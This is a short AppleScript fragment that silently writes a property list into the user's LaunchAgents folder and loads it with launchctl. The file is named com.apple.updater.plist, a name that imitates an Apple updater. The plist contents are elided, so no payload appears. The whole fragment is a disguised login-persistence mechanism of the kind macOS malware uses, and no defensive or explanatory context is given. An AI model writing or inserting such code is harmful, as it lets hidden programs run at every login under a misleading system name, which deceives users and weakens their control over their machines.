set plist to "<?xml version='1.0'?><plist version='1.0'>...</plist>"
do shell script "echo " & quoted form of plist & " > ~/Library/LaunchAgents/com.apple.updater.plist"
do shell script "launchctl load ~/Library/LaunchAgents/com.apple.updater.plist"
